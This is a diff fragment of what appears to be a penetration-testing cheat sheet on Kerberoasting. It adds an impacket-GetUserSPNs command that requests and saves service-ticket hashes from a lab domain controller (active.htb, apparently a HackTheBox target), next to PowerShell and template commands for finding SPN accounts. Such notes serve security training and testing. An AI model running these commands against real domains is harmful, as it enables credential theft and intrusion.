@@ -44,6 +44,7 @@ Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincip
 
 ```text
 python GetUserSPNs.py <DomainName>/<DomainUser>:<Password> -outputfile <FileName>
+impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS -request -save -outputfile GetUserSPNs.out
 ```
 
 Rubeus:
